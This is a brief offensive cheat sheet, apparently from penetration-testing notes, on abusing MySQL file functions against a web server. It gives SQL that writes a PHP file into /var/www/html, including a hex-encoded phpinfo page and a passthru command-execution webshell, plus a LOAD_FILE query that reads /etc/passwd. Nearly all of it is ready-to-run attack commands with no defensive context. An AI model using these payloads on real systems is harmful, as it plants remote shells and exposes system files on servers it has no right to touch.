# MySQL Webshell (PHP)

- use mysql outfile/ dumpfile function to upload a shell.

## Option 1

```
echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e

SELECT 0x3c3f70687020706870696e666f28293b203f3e INTO OUTFILE "/var/www/html/phpinfo.php"
```

## Option 2

```
SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
```

- use mysql loadfile to read file contents

```
SELECT LOAD_FILE('/etc/passwd');
```